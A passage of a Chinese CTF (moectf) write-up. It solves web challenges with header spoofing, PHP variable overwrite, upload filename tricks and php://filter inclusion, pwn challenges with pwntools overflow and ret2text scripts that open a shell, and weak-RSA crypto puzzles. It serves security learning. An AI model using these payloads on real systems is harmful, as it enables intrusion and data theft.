> 描述:在一个月黑风高的夜晚，dbt黑掉了云之君的电脑，并将里面的代码改得一团糟。紧接着track神也来了，又悄悄在代码里加了点东西。作为逆向带师的你，能成功找到flag吗？
>
> hint:
>
> 1. 尝试patch输出为check过的长度，写交互脚本来爆破。

非预期:先输了88个a看输入咋变化的,结果发现最后用来比较的数组里是88个一样的复杂数字

即`0x61('a')` 经过中间的算法一定会变成 `0x0D7C1A410`

试了一下输入`abcdefghijklmnopqrstuvwxyz1234567890_!ABCDEFGHIJKLMNOPQRSTUVWXYZ{}aaaaaaaaaaaaaaaaaaaaaa`

发现`a`变成`0x0D7C1A410`,`b`变成`0x9E3919E7`...

和数据对比一下就能还原出flag了

```python
a = [0x64744C9A, 0x047C2FF1, 0xA2D74292, 0x85BEF77E, 0x711FCBF7, 0x669E1609, 0x6BBD9DB6, 0x6941C8A4, 0xB16E48B3, 0xDE321186, 0x5251E8C2, 0xFB8F95A7, 0x711FCBF7, 0xCB5C3FAD, 0x36568AF5, 0xFB8F95A7, 0x82ACF96A, 0x75DCD570, 0x7EF00E40, 0xFB8F95A7, 0x4BE9314A, 0xCB5C3FAD, 0xA2D74292, 0xDE321186, 0xFB8F95A7, 0x46927FA8, 0xB16E48B3, 0xD7C1A410, 0x567375C3, 0x711FCBF7, 0xFB8F95A7, 0x9C19F0F3, 0xD035E914, 0xFB8F95A7, 0x6941C8A4, 0x0B7D1395, 0xD7C1A410, 0xC87A7C7E, 0xFB8F95A7, 0xD7C1A410, 0xDE321186, 0x5251E8C2, 0xFB8F95A7, 0xD5380C52, 0xBEA99D3B, 0xCEDB7952, 0xFB8F95A7, 0x73456320,
     0xD7C1A410, 0xDE321186, 0xFB8F95A7, 0x581D99E5, 0xA2D74292, 0x711FCBF7, 0xFB8F95A7, 0x06372812, 0xFB8F95A7, 0x73456320, 0xCEDB7952, 0xEF53E254, 0xFB8F95A7, 0x9F12424D, 0x669E1609, 0xFB8F95A7, 0x9C19F0F3, 0xFECF7685, 0x0B7D1395, 0x1833E8B1, 0xFB8F95A7, 0x9F66DD04, 0xA2D74292, 0xD7C1A410, 0xFB8F95A7, 0x6941C8A4, 0x866CAF4F, 0x047C2FF1, 0x64744C9A, 0xFB8F95A7, 0xD5380C52, 0xCEDB7952, 0xDE321186, 0x81453D43, 0xCB5C3FAD, 0xB16E48B3, 0xC578F843, 0xCEDB7952, 0xDE321186, 0xE38C6F07, 0x8B9E97A8, 0x8FDF9EDF, 0xD1868B96, 0x93AFD1D1, 0x8D8BDF85, 0x989EDF86, 0xDF91969E, 0xF5C3A0C1, 0x00000000][:88]
b = "abcdefghijklmnopqrstuvwxyz1234567890_!ABCDEFGHIJKLMNOPQRSTUVWXYZ{}aaaaaaaaaaaaaaaaaaaaaa"
c = [0x0D7C1A410, 0x9E3919E7, 0x85BEF77E, 0x5251E8C2, 0x0A2D74292, 0x669E1609, 0x5C1DFF11, 0x0CB5C3FAD, 0x0FECF7685, 0x0B0F33A9A, 0x1833E8B1, 0x0B7D1395, 0x64744C9A, 0x0DE321186, 0x47C2FF1, 0x0EF53E254, 0x1902B329, 0x866CAF4F, 0x4A528AE0, 0x711FCBF7, 0x0CEDB7952, 0x352B172C, 0x0AFEA7FF6, 0x3175EDAB, 0x0D035E914, 0x20D324AE, 0x0B16E48B3, 0x5C6054F, 0x36568AF5, 0x0BEA2375F, 0x567375C3, 0x0BF0FD0CB, 0x4BE9314A, 0x7F2A2EBE, 0x0C87A7C7E, 0x0BEA99D3B, 0x0FB8F95A7, 0x94D2FB03, 0x6372812, 0x46927FA8, 0x73456320, 0x4E3F843, 0x75DCD570, 0x6941C8A4,
     0x581D99E5, 0x7EF00E40, 0x7A260E4D, 0x0C578F843, 0x17947C53, 0x786C70, 0x9C19F0F3, 0x1D795AC9, 0x9F12424D, 0x0AB021E08, 0x77ACB10, 0x0D1D0F68E, 0x82ACF96A, 0x9F66DD04, 0x8AD9BAF7, 0x0AAE6D8C9, 0x0E73CAEF, 0x0BFC92893, 0x0D5380C52, 0x81453D43, 0x6BBD9DB6, 0x0E38C6F07, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410, 0x0D7C1A410]
for i in a:
    print(b[c.index(i)], end="")

```

和yun聊了一下,官解应该是patch二进制文件,改printf的参数,使程序输出校验正确的位数,然后写脚本和程序交互,爆破出flag

> moectf{F1nd_th3_SEH_7hen_B1a5t_My_Fla9_and_Y0u_Can_Get_A_Cup_Of_Milk_Tea_From_YunZh1Jun}

## Web

### 指南

> https://ctf.xidian.edu.cn/api/storage/44aa09f193665b0b74eba991960aeb4f46e7ab7c121a64084380d6b41bac6b12/%E6%8C%87%E5%8C%97web.pdf

### ezhtml

> 描述:cyxq高考并不是很理想，你能帮他把成绩改到600分以上用来截图吗 题目地址：82.156.5.200:1038

f12修改,js里要求分数和等于总分,且总分大于600,改html或者直接看js都行

> moectf{W3lc0me_to_theWorldOf_Web!}

### God_of_Aim

> 描述:Ghost最近沉迷FPS，你能打通这个小游戏吗？题目地址：82.156.5.200:1039

先点中十个,发现alert了半个flag

看aimtrainer.js,满足一定条件就会alert出_0x78bd里的东西,把0x78bd里的东西输出出来找就找到了

```python
a = ["\x61\x69\x6D\x54\x72\x61\x69\x6E\x65\x72\x45\x6C", "\x61\x69\x6D\x2D\x74\x72\x61\x69\x6E\x65\x72", "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64", "\x73\x63\x6F\x72\x65\x45\x6C", "\x73\x63\x6F\x72\x65", "\x61\x69\x6D\x73\x63\x6F\x72\x65", "\x64\x65\x6C\x61\x79", "\x74\x61\x72\x67\x65\x74\x53\x69\x7A\x65", "\x61\x69\x6D\x73\x63\x6F\x72\x65\x45\x4C", "\x73\x65\x74\x53\x63\x6F\x72\x65", "\x73\x74\x61\x72\x74", "\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C", "\x73\x65\x74\x41\x69\x6D\x53\x63\x6F\x72\x65", "\x70\x6F\x73\x69\x74\x69\x6F\x6E",
     "\x73\x74\x79\x6C\x65", "\x72\x65\x6C\x61\x74\x69\x76\x65", "\x74\x69\x6D\x65\x72", "\x63\x72\x65\x61\x74\x65\x54\x61\x72\x67\x65\x74", "\x63\x68\x65\x63\x6B\x66\x6C\x61\x67\x31", "\x63\x68\x65\x63\x6B\x66\x6C\x61\x67\x32", "\x73\x74\x6F\x70", "\x6D\x6F\x65\x63\x74\x66\x7B\x4F\x68\x5F\x79\x6F\x75\x5F\x63\x61\x6E\x5F\x61\x31\x6D\x5F", "\u4F60\u5DF2\u7ECF\u5B66\u4F1A\u7784\u51C6\u4E86\uFF01\u8BD5\u8BD5\u770B\x3A", "\x73\x74\x61\x72\x74\x32", "\x61\x6E\x64\x5F\x48\x34\x63\x6B\x5F\x4A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x7D"]
for i in a:
    print(i)
```

> moectf{Oh_you_can_a1m_and_H4ck_Javascript}

### ezphp

打开直接把php给出来了

```php
<?php

highlight_file('source.txt');
echo "<br><br>";

$flag = 'xxxxxxxx';
$giveme = 'can can need flag!';
$getout = 'No! flag.Try again. Come on!';
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($giveme);
}

if($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag'){
    exit($getout);
}

foreach ($_POST as $key => $value) {
    $$key = $value;
}

foreach ($_GET as $key => $value) {
    $$key = $$value;
}

echo 'the flag is : ' . $flag;

?>
```

`highlight_file()` 函数对文件进行 PHP 语法高亮显示。

`isset`函数用于检测变量是否已设置并且非 NULL。

`foreach`是遍历

foreach(\$\_POST as \$\_key=>\$_value) 解释为遍历\$\_POST数组内的元素，每组元素为一个键（\$key）对应一个值（\$value）的形式。

```php
$arr = array("1"=>"111","2"=>"222","3"=>"333");
foreach($arr as $key=>$value)
{echo $key."=>".$value."\n";}
输出:
1=>111
2=>222
3=>333
```

关键在于`$$key = $$value`有变量覆盖漏洞

首先要了解一下php中的变量,以及$符号的作用:

**在PHP中变量是以\$符号开头命名的，所以\$\$可变变量就是以一个变量的值作为一个变量的名。**

```php
<?php
$a="qwe";
$qwe=1232;
var_dump($$a);
?>
输出: int(1232)
```

变量a的值\$a=qwe,变量qwe的值\$qwe=1232,变量$a的值即$(\$a)=\$(qwe)=1232



再回去分析php代码:

exit(\$giveme)所属那一块代码表示**需要\_GET数组和\_POST数组中都有flag**(实际做的时候上发现是一个数组里有就行了,我可能哪搞错了)

exit(\$getout)所属那一块表示**不能传flag=flag**

之后是两个foreach的遍历,其中get的那个**有变量覆盖漏洞**

POST`$_GET['flag']='flag'`的话,遍历\_GET数组的时候就能使得`$flag=$flag`



思路有了之后就是burpsuite抓包再请求

burpsuiteGET改POST:

1. 开头改请求方式
2. 加一行Content-Type: application/x-www-form-urlencoded
3. 在末尾空一行再写参数

```http
POST /?flag=1 HTTP/1.1
Host: 82.156.5.200:1042
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: login=0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

_GET['flag']=flag
```

> moectf{Wa0g_Yi1g_Chu0}

### cookiehead

> 描述:RT http://82.156.5.200:1043

访问提示仅限本地访问

搜索了一下:

> [CTF新手，请问从本地访问flag！_你们这样一点都不可耐的博客-CSDN博客_ctf 本地访问](https://blog.csdn.net/vanarrow/article/details/107800921) 
>
> X-Forwarded-For 是一个 HTTP 扩展头部,用来表示 HTTP 请求端真实 IP
> 一般的客户端(例如：浏览器)在发送HTTP请求时，并不会设置`X-Forwarded-For头`，当请求在到达第一个`代理服务器`时，`代理服务器`会在请求字段中加上`X-Forwarded-For字段`，并将其值设置为`客户端的IP地址`，后面如果还有更多的代理服务器，会`依次将Ip地址追加`到X-Forwarded-For这个字段中，最终当请求到达了Web应用服务器，应用会通过获取X-Forwarded-For头取出最左边的IP地址，即为客户端的真实IP地址。
>
> 如果客户端在发起请求时，请求头上带上一个伪造的X-Forwarded-For，由于后续每层代理只会追加而不会覆盖，那么最终到达应用服务器时，最左边的IP地址就是客户端伪造的IP地址。
>

访问http://82.156.5.200:1043/localhost

在末尾添加`X-Forwarded-For: 127.0.0.1`,伪造IP

发送后提示请先登录

把cookie的值改为1,显示 "You are not from http://127.0.0.1/index.php"

> [HTTP Referer 教程 - 阮一峰的网络日志 (ruanyifeng.com)](https://www.ruanyifeng.com/blog/2019/06/http-referer.html)
>
> `HTTP Referer`是`header`的一部分，当浏览器向web服务器发送请求的时候，一般会带上`Referer`，**指明当前流量的来源参考页**
>
> 很有趣的是，这个字段的拼写是错的。`Referer`的正确拼写是`Referrer`，但是写入标准的时候，不知为何，没人发现少了一个字母`r`。标准定案以后，只能将错就错，所有头信息的该字段都一律错误拼写成`Referer`。
>
> 浏览器向服务器请求资源的时候，`Referer`字段的逻辑是这样的，用户在地址栏输入网址，或者选中浏览器书签，就不发送`Referer`字段。
>
> 主要是以下三种场景，会发送`Referer`字段。
>
> （1）用户点击网页上的**链接**。
>
> （2）用户发送**表单**。
>
> （3）网页加载**静态资源**，比如加载图片、脚本、样式。
>
> 上面这些场景，浏览器都会将当前网址作为`Referer`字段，放在 HTTP 请求的头信息发送。
>
> 浏览器的 JavaScript 引擎提供`document.referrer`属性，可以查看当前页面的引荐来源。注意，这里采用的是正确拼写。

所以在末尾添加`Referer:http://127.0.0.1/index.php`

```http
GET /localhost HTTP/1.1
Host: 82.156.5.200:1043
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: login=1
Connection: close
X-Forwarded-For: 127.0.0.1
Referer:http://127.0.0.1/index.php
```

> moectf{th1s_is_http_protocolllll}

### What are you uploading

> 描述:can can need 马?????！82.156.5.200:1044

文件上传:[CTF技能梳理系列 ---- 文件上传_Joker_York的博客-CSDN博客](https://blog.csdn.net/Joker_York/article/details/108361445)

前端验证代码:

```html
<html lang="en">
<head>
<meta charset="UTF-8">
<title>图片上传</title>
</head>
<body>
<form action="upload.php" method="post" onsubmit="return checkFile()" enctype="multipart/form-data">
<input type="file" name="file" id="file" /><br/>
<input type="submit" value="提交" name="submit" />
</form>
</body>
<script type="text/javascript">
function checkFile()
{
     var flag = false;
     var str = document.getElementById("file").value;
     str = str.substring(str.lastIndexOf('.') + 1);
     var arr = new Array('png','jpg','gif');
     for(var i=0;i<arr.length;i++)
     {
         if(str==arr[i])
         {
            flag = true;
         }
     }
     if(!flag)
     {
        alert('可恶的hacker！只能上传.png或.jpg或gif!');
        return false;
     }
     return flag;
}
</script>
</html>
```

> [HTML  标签的 enctype 属性 (w3school.com.cn)](https://www.w3school.com.cn/tags/att_form_enctype.asp) 
>
> HTML <form> 标签的 `enctype` 属性:
>
> `enctype`属性规定在发送到服务器之前应该如何对表单数据进行`编码`。
>
> 默认地，表单数据会编码为 "application/x-www-form-urlencoded"。就是说，在发送到服务器之前，所有字符都会进行编码（空格转换为 "+" 加号，特殊符号转换为 ASCII HEX 值）。
>
> `multipart/form-data`:
>
> 一般来说常常在`需要发送文件`或者需要发送文件加文本的时候我们会使用`FromData类型`的数据格式来发送
>
> POST请求时发送`FormData类型`的数据将会设置`multipart/form-data`

前端里对文件类型有验证,白名单有png,jpg,gif

传了张png,显示 "我不想这个特洛伊文件,给我一个f1ag.php 我就给你flag"

> `Content-Disposition`:
>
> 1. 作为主体的响应标题(显示/下载)
>
>    在常规 HTTP 响应中，Content-Disposition响应标头是指示内容是否预期在浏览器**内联显示**的标题，即，**作为网页**或**作为网页的一部分**或**作为附件下载并且本地保存**。
>
>    HTTP 上下文中的第一个参数是**inline**（默认值，表示它可以显示在网页内，或作为网页）
>
>    或**attachment**（表示它应该下载;大多数浏览器呈现“另存为”对话框，预先填入**filename**如果存在参数的值
>
>    ```
>    Content-Disposition: inline
>    Content-Disposition: attachment
>    Content-Disposition: attachment; filename="filename.jpg"
>    ```
>
> 2. ###### 作为多部分主体的 header(本题相关)
>
>    在一个`multipart/form-data`正文中，HTTP `Content-Disposition`通用标题是一个标题，可以在多部分主体的子部分中使用，以提供有关它适用的**字段的信息**。
>
>    所述`Content-Disposition`的 header 在 MIME 消息的电子邮件的更大的范围内定义的，但仅可能的参数的子集应用于 HTTP 形式和`POST`请求。只有值`form-data`，以及可选的指令`name`和`filename`，可以在 HTTP 上下文中使用。
>
>    HTTP 上下文中的第一个参数总是`form-data`; 其他参数不区分大小写，并且有参数，在`'='`符号后面使用带引号的字符串语法。多个参数用分号（`';'`）分隔。
>
>    ```
>    Content-Disposition: form-data
>    Content-Disposition: form-data; name="fieldName"
>    Content-Disposition: form-data; name="fieldName"; filename="filename.jpg"
>    ```

抓包,把`Content-Disposition`里的filename改成`f1ag.php`,得到flag

```http
POST /upload.php HTTP/1.1
Host: 82.156.5.200:1044
Content-Length: 271
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://82.156.5.200:1044
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTGfWnOc4cEBO9rrq
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://82.156.5.200:1044/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: login=0
Connection: close

------WebKitFormBoundaryTGfWnOc4cEBO9rrq
Content-Disposition: form-data; name="file"; filename="f1ag.php"
Content-Type: image/png


------WebKitFormBoundaryTGfWnOc4cEBO9rrq
Content-Disposition: form-data; name="submit"

------WebKitFormBoundaryTGfWnOc4cEBO9rrq--
```

> moectf{A0_Qua1_D0ne!}

### baby_file

> 描述:“海纳百川，有容乃大；壁立千仞，无欲则刚。” 寓意人要像大海能容纳无数江河水一样的胸襟宽广，以容纳和融合来对他人。( http://82.156.5.200:1041 )

```html
<html>
<title>Here's a secret. Can you find it?</title>
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
?>
</html>
```

> 文件包含:
>
> [CTFSHOW-WEB入门-文件包含 - Athena-ydy - 博客园 (cnblogs.com)](https://www.cnblogs.com/Athena-ydy/p/15861262.html)
>
> 看了看这个↑,flag就出了,搜到了↓这个,稍微学习了一下
>
> [php://filter协议在任意文件读取漏洞中的利用（学习总结）_头秃的bug的博客-CSDN博客_php://filter/read](https://blog.csdn.net/L2329794714/article/details/121288668?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-121288668-blog-102527374.pc_relevant_aa_2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-121288668-blog-102527374.pc_relevant_aa_2&utm_relevant_index=1)
>
> 
>
> - `php://`是一种协议名称,php在访问或打开文件时为建立一个IO流的方式，而`php://`协议则可以访问这个IO流
>
> - `php://filter/`是一种访问**本地文件**的协议,可以通过这个玩意对上面提到的php IO流进行处理，及现在可以对php的IO流进行一定操作。
>
>  格式为：php://filter / [read|write =] 过滤器 / resource= 目标文件
>
> - `/read=convert.base64-encode/`表示读取的方式是base64编码
> - `resource=flag.php`表示目标文件(要过滤的数据流)为`flag.php`

http://82.156.5.200:1041/?file=php://filter/convert.base64-encode/resource=flag.php

得到base64后的flag.php的源码:

```
PD9waHANCkhleSBoZXksIHJlYWNoIHRoZSBoaWdoZXN0IGNpdHkgaW4gdGhlIHdvcmxkISBBY3R1YWxseSBJIGFtIGlrdW4hITsNCg0KbW9lY3Rme1kwdV9hcmVfdDAwX2JhYnlfbGF9Ow0KDQo/Pg==
```

> <?php
> Hey hey, reach the highest city in the world! Actually I am ikun!!;
>
> moectf{Y0u_are_t00_baby_la};
>
> ?>

## PWN

### 指南

> [pwn.pdf (xidian.edu.cn)](https://ctf.xidian.edu.cn/api/storage/5387d9d0f00524d7b332249c5a17201978b36fcc1d75d985b7c008a2cab74ff0/pwn.pdf) 

### shell

> 描述:你会用 Linux 吗? 你知道什么是 Shell 吗? 题目地址：nc 43.136.137.17 3907

nc进去ls看一下发现有个flag,直接cat flag

> moectf{W3lc0m3_t0_The_Pwn_W0r1d}

### int_overflow

> 描述:来做小学数学题! 题目地址： nc 43.136.137.17 3908

整数溢出,要用pwntools交互

recv把数字拿出来,用0x100000000减去数字得到x,使x+数字=0x100000000,溢出,send发送x即可

```python
from pwn import *
context.log_level = 'debug'
#p = process("./int_overflow")
p = remote('43.136.137.17',3908)
recv = p.recvuntil("If ")
recv = p.recvuntil(" ")
a = int(recv)
log.success("a : %d" % a)
b = 0x100000000-a
p.sendline(str(b))
p.interactive()
```

> moectf{Ur_3ntr1n9_4m421n9_c0umput3r_w0rld}

### endian

> 描述:剥鸡蛋是先剥大头还是先剥小头? 题目地址：nc 43.136.137.17 3912

考察大小端序,scanf输入两个%d,每个4字节,然后和MikatoNB比较

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s2[4]; // [rsp+10h] [rbp-10h] BYREF
  _BYTE v5[12]; // [rsp+14h] [rbp-Ch] BYREF

  *(_QWORD *)&v5[4] = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  __isoc99_scanf("%d%d", s2, v5);
  if ( !strncmp("MikatoNB", s2, 8uLL) )
    system("/bin/sh");
  return 0;
}
```

```python
from pwn import *
#p = process("./endian")
p = remote('43.136.137.17', 3912)
p.sendline(str(0x616b694d)+' '+str(0x424e6f74)) #akiM BNot
p.interactive()
```

> moectf{I_sta2t_p33ling_e99s_fr0m_7he_m1ddle}

### filedes

> 描述:Everything is a file! 题目地址：nc 43.136.137.17 3909

搜索题目名字filedes,搜出来linux的文件描述符:

[通过pwnable.kr从零学pwn_giantbranch的博客-CSDN博客](https://blog.csdn.net/u012763794/article/details/51992512)

[fd、open()、write()是一组奇妙的组合 - ZHJ0125 - 博客园 (cnblogs.com)](https://www.cnblogs.com/ZHJ0125/p/12904490.html)

| Integer value | Name            | <unistd.h> symbolic constant[1] | <stdio.h> file stream[2] |
| ------------- | --------------- | ------------------------------- | ------------------------ |
| 0             | Standard input  | STDIN_FILENO                    | stdin                    |
| 1             | Standard output | STDOUT_FILENO                   | stdout                   |
| 2             | Standard error  | STDERR_FILENO                   | stderr                   |

main函数：分别获取read函数和write函数的文件描述符

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int fd; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("In UNIX, everything is a file.");
  puts("Your screen is a file, too.");
  puts("Do you know how to print flag on your screen file?");
  close(1);
  open("/flag.txt", 0);
  __isoc99_scanf("%u", &fd);
  read(fd, flag, 0x40uLL);
  __isoc99_scanf("%u", &fd);
  write(fd, flag, 0x40uLL);
  return 0;
}
```

nc连上,输1回车再输0回车即可(这题我用pwntools写交互写不出来,不知道是不是有c库函数的原因?)

> moectf{huh_s0_e4sy_fd_r1ght?}

### ret2text

> 描述:I hate CET-4...Where's the gift? nc moectf.challenge.ctf.show 27002
> hint:
>
> 1. Add a ret.

buf只有64字节大小,read了0x64(100)字节大小,可以溢出

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  __int64 v4; // rdi
  int v5; // eax
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("I've prepared a gift for you, if you don't want to keep learning CET-4 words, find it out!");
  v3 = time(0LL);
  v4 = v3;
  srand(v3);
  v5 = rand();
  ((void (__fastcall *)(__int64, const char **))learn[v5 % 100])(v4, argv);
  printf("Make a wish: ");
  read(0, buf, 0x64uLL);
  return 0;
}
```

找到后门函数`/bin/sh`在action函数里,地址`00000000004014BA`

```c
int action()
{
  return system("/bin/sh");
}
```

hint里还写了add a ret,因为在执行system前要堆栈平衡

> 在Ubuntu18以上的版本，64位的程序若包含了system（“/bin/sh”），就需要考虑堆栈平衡。因为在Ubuntu18下system调用时要求地址和16字节对齐，如果没有栈对齐的话，程序就直接crash了。

```python
from pwn import *
context.log_level = 'debug'
#p = process("./ret2text")
p=remote('moectf.challenge.ctf.show',27002)
#gdb.attach(p)

success_addr = 0x4014BA
payload = b'a' * 64 +b'b'*8 +  p64(0x401CF5)+p64(success_addr)
p.sendline(payload)
p.interactive()
```

### random

> 描述：上帝会掷骰子吗? 题目地址：nc 43.136.137.17 3911
>
> hint:
>
> 1. border?

让输入username和password,然后password和`ls_4nyth1n9_7ruIy_R4nd0m?`对比,错了就退出

要注意的是,在ida动调输入`ls_4nyth1n9_7ruIy_R4nd0m?`之后,字符串后面会有一个换行符0A,如果要通过strcmp,需要patch成00

如果是pwntools的话,需要使用`send函数`,而不是`sendline函数`

接下来出现了很多srand,rand,关于这两个函数可以看:[PWN:关于对Random函数的研究](https://blog.csdn.net/m0_53932372/article/details/123200587) ,可以知道srand(time)确实是随机的,除非能**获取seed**,我还找到了攻防世界的DICE_GAME,这题是用read覆盖掉seed,但是这一题并不能溢出,又卡住了

最后在python中同时调用time函数获取了seed

```python
from pwn import *
from ctypes import *
import time
context.log_level = 'debug'
p = process("./random")
p = remote('43.136.137.17',3911)
seed = int(time.time())
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(seed)
v3 = libc.rand()
v4 = libc.rand() ^ v3
v5 = libc.rand()
libc.srand(v4^v5)
libc.rand()
libc.rand()
libc.rand()
v8 = libc.rand()
p.sendline('a')
p.send(b"ls_4nyth1n9_7ruIy_R4nd0m?"+b"\x00"*7)
p.sendline(str(v8))
p.interactive()
```

> moectf{9od_doe5_n0t_pl4y_dic3}

## 密码

### 指南

[CTF密码学入门指北.pdf (xidian.edu.cn)](https://ctf.xidian.edu.cn/api/storage/7f771f89ed4c1405345cdc472e1622d91c5a382bca22b7c1b427a5860a638e71/CTF密码学入门指北.pdf) 

### signin

> 描述:”你这个e取得有问题吧“  ”没有“（嘴硬）
>
> hint:
>
> 1. flag < P,Q
> 2. 如果暂时没想出来可以先看看别的，signin的难度不一定很signin

~~这题把我做自闭了,被signin狠狠地拷打,心态巨崩,请教了一下做出来的师傅,只学知识,没交flag，应该不算py吧QaQ~~

e和phi不互素,和p-1互素

m^e%n=c 又因为c<n => m^e%n=c%n => m^e%p=c%p

构造e模phi(p)的逆元d => c\^d%p=(m\^e)\^d%p=m%p

又因为m<p => m=m%p=c^d%p

```python
from Crypto.Util.number import*
import gmpy2
p = 12408795636519868275579286477747181009018504169827579387457997229774738126230652970860811085539129972962189443268046963335610845404214331426857155412988073
q = 12190036856294802286447270376342375357864587534233715766210874702670724440751066267168907565322961270655972226761426182258587581206888580394726683112820379
c = 68960610962019321576894097705679955071402844421318149418040507036722717269530195000135979777852568744281930839319120003106023209276898286482202725287026853925179071583797231099755287410760748104635674307266042492611618076506037004587354018148812584502385622631122387857218023049204722123597067641896169655595
e = 65537
n = p * q
phi = (p-1)
d = gmpy2.invert(e, phi)
d = 1965163036322073223251558880518455097007843733747965980475556605395913865635411251423842383032647664515839361455041570905905137013447984281846139066960697
m = pow(c, d, p)
flag = long_to_bytes(m)
print(flag)
```

> moectf{Oh~Now_Y0u_Kn0W_HoW_RsA_W0rkS!}

### 一次就好

> “一次就好，我陪你去看天荒地老~~~~”

给了个c,把flag用'#'填充到和c同样长度,再和c异或作为密文m

然后随机一个p,用gmpy2里的next_prime生成了与p相近的q

阅读了[浅析RSA因子大小相近时分解因子攻击方法](https://www.freebuf.com/articles/database/290623.html) 

√N一定在p和q中间,所以next_prime(√N)一定是q,p就是N//q

得到p和q之后,就是RSA正常的流程,求phi,求d...

题目:

```python
from Crypto.Util.strxor import strxor
from Crypto.Util.number import *
from gmpy2 import powmod, next_prime
from FLAG import flag
import codecs

c = b'Just once,I will accompany you to see the world'
flag = flag.ljust(len(c), '#')  # 把flag填充到和c同样长度
key = strxor(flag.encode(), c)  # flag和c异或
m = bytes_to_long(key)  # 转换成long型

p = getPrime(512)
q = next_prime(p)
N = p*q
e = 0x10001

gift = powmod(m, e, N)

print(gift)
print(N)

gift = 127749242340004016446001520961422059381052911692861305057396462507126566256652316418648339729479729456613704261614569202080544183416817827900318057127539938899577580150210279291202882125162360563285794285643498788533366420857232908632854569967831654923280152015070999912426044356353393293132914925252494215314
N = 164395171965189899201846744244839588935095288852148507114700855000512464673975991783671493756953831066569435489213778701866548078207835105414442567008315975881952023037557292470005621852113709605286462434049311321175270134326956812936961821511753256992797013020030263567313257339785161436188882721736453384403

```

exp:

```python
from Crypto.Util.number import*
from Crypto.Util.strxor import strxor
import gmpy2
e = 0x10001
gift = 127749242340004016446001520961422059381052911692861305057396462507126566256652316418648339729479729456613704261614569202080544183416817827900318057127539938899577580150210279291202882125162360563285794285643498788533366420857232908632854569967831654923280152015070999912426044356353393293132914925252494215314
N = 164395171965189899201846744244839588935095288852148507114700855000512464673975991783671493756953831066569435489213778701866548078207835105414442567008315975881952023037557292470005621852113709605286462434049311321175270134326956812936961821511753256992797013020030263567313257339785161436188882721736453384403

tmp = gmpy2.iroot(N, 2)[0]
q = gmpy2.next_prime(tmp)
p = N//q
# print("p=", p)
# print("q=", q)

phi = (p-1)*(q-1)
d = gmpy2.invert(e, phi)
m = pow(gift, d, N)
flag = long_to_bytes(m)
c = b'Just once,I will accompany you to see the world'
print(strxor(flag, c))

```

> moectf{W0w_y02_k5ow_w6at_1s_one_t1m3_pa7}

### 0rsa0

> 描述:无

flag有效部分为32位,分成两部分

第一部分RSA小公钥指数

第二部分dp泄露[RSA-详解dp泄漏](https://blog.csdn.net/weixin_45369385/article/details/109208109)

题目：

```python
from Crypto.Util.number import *
from flag import flag

assert flag[0:7] == b'moectf{'
assert flag[-1:] == b'}'
flag = flag[7:-1]
assert len(flag) == 32

m1 = bytes_to_long(flag[0:16])
m2 = bytes_to_long(flag[16:32])


def enc1(m):
    p = getPrime(512)
    q = getPrime(512)
    n = p * q
    e = 3
    c = pow(m, e, n)
    return n, e, c


def enc2(m):
    p = getPrime(512)
    q = getPrime(512)
    e = 65537
    d = inverse(e, (p-1)*(q-1))
    n = p * q
    dp2 = d % (p-1)
    c = pow(m, e, n)
    return n, e, c, dp2


n1, e1, c1 = enc1(m1)
n2, e2, c2, dp2 = enc2(m2)

print("n1=" + str(n1))
